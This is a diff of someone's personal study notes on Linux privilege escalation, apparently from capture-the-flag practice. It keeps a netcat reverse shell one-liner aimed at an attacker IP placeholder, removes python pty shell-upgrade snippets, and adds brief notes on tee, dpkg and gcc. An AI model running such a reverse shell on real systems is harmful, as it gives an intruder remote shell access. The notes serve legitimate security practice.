@@ -7,9 +7,6 @@ There are two common types of privilege escalation: vertical and horizontal. Ver
 
 
 
-
-
-
 ## Linux-Smart-Enumeration
 * Check out the github page right <a href="https://github.com/diego-treitos/linux-smart-enumeration">here</a>.
 
@@ -21,21 +18,11 @@ There are two common types of privilege escalation: vertical and horizontal. Ver
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
 	```
 
-## Spawn a Shell When Connecting to a Reverse Shell   
-	```console
-	python -c 'import pty;pty.spawn("/bin/bash");'
 
-	//or
-
-	python3 -c 'import pty;pty.spawn("/bin/bash");'
-	```
 
 ## Upgrade the Reverse Shell   
 
-* Using Python for a psuedo terminal  
-	```console
-	python -c 'import pty; pty.spawn("/bin/bash")'
-	``` 
+
 
 * Using `socat` instead of `nc`  
 
@@ -166,3 +153,25 @@ export PATH=/tmp:$PATH
 ____ 
 I have to write more about this 
 * SUID (Set owner User ID)
+
+
+
+<br/>
+
+* `[COMMAND] | tee [FILE NAME]` 
+* Stores output of the command in a file.  
+
+<br/>
+
+* `dpkg -l`  
+* Shows the packages and libraries on system.
+* I think this command is only for Debian based OSes 🤔.
+
+
+<br/>
+
+* Some info on gcc  
+* The option `-Wall` is a warning option.  
+* ### <span class="useful_shit subtitle">Upgrading The Reverse Shell   
+
+* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  
